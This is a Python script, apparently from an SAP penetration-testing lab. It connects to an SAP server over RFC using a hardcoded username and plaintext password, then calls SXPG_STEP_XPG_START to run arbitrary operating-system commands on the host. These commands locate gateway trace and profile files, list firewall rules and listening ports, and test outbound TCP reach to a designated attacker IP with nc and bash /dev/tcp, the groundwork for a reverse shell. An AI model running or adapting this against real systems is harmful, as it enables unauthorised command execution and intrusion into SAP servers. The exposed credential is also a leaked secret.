#!/usr/bin/env python3
"""
test_rfc_diag2.py — Targeted RFC diagnostics for NILIST connection issue.
"""
import sys, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST     = '192.168.2.209'
SYSNR    = '00'
CLIENT   = '001'
USER     = 'joris'
PASSWD   = 'Schaap123!'
ATT_IP   = '192.168.2.210'
ATT_PORT = 33200


BASE = dict(
    TARGET="", DESTINATION="",
    STDINCNTL="R", STDOUTCNTL="M", STDERRCNTL="M",
    TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
    LONG_PARAMS="", CONNCNTL="H",
)


def sxpg(conn, prog, params, label):
    print(f"\n[CMD] {label}: {prog} {params}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:   r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                print(f"  ERROR: {e}"); return
    except Exception as e:
        print(f"  ERROR: {e}"); return
    for row in r.get("LOG", []):
        line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
        line = line.rstrip()
        if line: print(f"  {line}")
    print(f"  [exit={r.get('STATUS','?')!r}]")


def main():
    print(f"[*] RFC connecting to {HOST}:{SYSNR} as {USER}...")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] Connected\n")

        # Find dev_gw file
        sxpg(conn, "/usr/bin/find", "/usr/sap/S4H -name dev_gw -maxdepth 6",
             "Find dev_gw trace file")

        # Find instance work dir
        sxpg(conn, "/bin/ls", "/usr/sap/S4H/",
             "List SAP instance dirs")

        # Try nc for TCP test
        sxpg(conn, "/usr/bin/nc", f"-z -w 3 {ATT_IP} {ATT_PORT}",
             f"TCP test nc to {ATT_IP}:{ATT_PORT}")

        # Try bash /dev/tcp
        sxpg(conn, "/bin/bash",
             f"-c echo>/dev/tcp/{ATT_IP}/{ATT_PORT}",
             f"TCP test bash /dev/tcp/{ATT_IP}/{ATT_PORT}")

        # nftables (replaces iptables on modern kernels)
        sxpg(conn, "/usr/sbin/nft", "list ruleset",
             "nftables ruleset (modern iptables replacement)")

        # iptables with correct path
        sxpg(conn, "/usr/sbin/iptables", "-L OUTPUT -n -v",
             "iptables OUTPUT (usr/sbin path)")

        # Check GW profile file
        sxpg(conn, "/usr/bin/find",
             "/usr/sap/S4H/SYS/profile -name DEFAULT.PFL -o -name S4H_DVEBMGS*",
             "Find GW profile files")

        # Check actual listening ports on SAP server
        sxpg(conn, "/usr/bin/ss", "-tlnp",
             "Listening TCP ports (ss)")

        # Check ss path
        sxpg(conn, "/usr/sbin/ss", "-tlnp",
             "Listening TCP ports (/usr/sbin/ss)")

        # GW log (different path guesses)
        for gw_log in [
            "/usr/sap/S4H/DVEBMGS00/work/dev_gw",
            "/usr/sap/S4H/DVEBMGS01/work/dev_gw",
            "/var/log/dev_gw",
        ]:
            sxpg(conn, "/usr/bin/test", f"-f {gw_log}",
                 f"Check if {gw_log} exists")

        print("\n[*] Done.")


if __name__ == '__main__':
    main()
